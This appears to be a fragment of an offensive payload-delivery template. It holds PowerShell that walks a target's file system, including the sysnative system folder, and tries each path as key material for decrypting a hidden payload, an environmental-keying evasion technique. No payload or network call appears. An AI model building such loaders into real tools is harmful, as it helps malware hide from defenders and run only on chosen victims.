buildcode="""
"""

callcode="""
	$dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {$_.FullName}
	[Environment]::Is64BitProcess
	#Select-String -Pattern sysnative
	$sys_paths = @("c:\", "c:\windows", "c:\windows\system32")
	
	if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) { # Is a 32bit process
		$dir_parsing += get-childitem "\Windows\sysnative\" -recurse -force -ErrorAction SilentlyContinue | % {$_.FullName}
	} 

	foreach ($some_dir in $dir_parsing){
		$temp_list = $key_combos
		$temp_list += $some_dir.ToLower()
		$temp_list
		Get-R-Done $lookup_table $payload_hash $minus_bytes $temp_list $key_iterations
	}

"""